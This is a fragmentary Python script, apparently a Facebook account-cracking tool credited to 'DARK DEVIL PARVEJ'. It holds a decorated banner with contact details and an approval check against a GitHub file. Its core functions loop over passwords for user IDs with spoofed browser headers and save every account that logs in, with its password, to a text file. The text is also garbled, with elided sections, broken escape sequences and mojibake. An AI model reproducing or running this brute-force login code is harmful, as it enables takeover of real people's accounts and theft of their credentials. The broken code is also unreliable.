...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By PARVEJ")
...
os.system("clear")
print(" \33[92;1m Subscribe  ON YouTube ")
...
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1mDARK DEVIL PARVEJ  ♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92mMOHAMMED PARVEJ  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+8801961049607 \33[38;5;46m                  ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92mPARVEJ-PS\33[38;5;46m ▇▎
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801961049607');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://youtube.com/@mr.black.devil.');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@mr.black.devil.');time.sleep(1)
		admin()
...
def hoga_check():
  ...
  try: 
    httpCaht = requests.get("https://github.com/BabaGaja/Paid-test/blob/main/Appval.txt").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93mPARVEJ\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "ChrPARVEJum";v="75"',
            "sec-ch-ua-mobile": '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/PARVEJ-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[PARVEJ] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}PARVEJ{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "sec-ch-ua": '"Google Chrome";v="107", "Not)A;Brand";v="24", "ChrPARVEJum";v="107"',
            "sec-ch-ua-mobile": '?1',
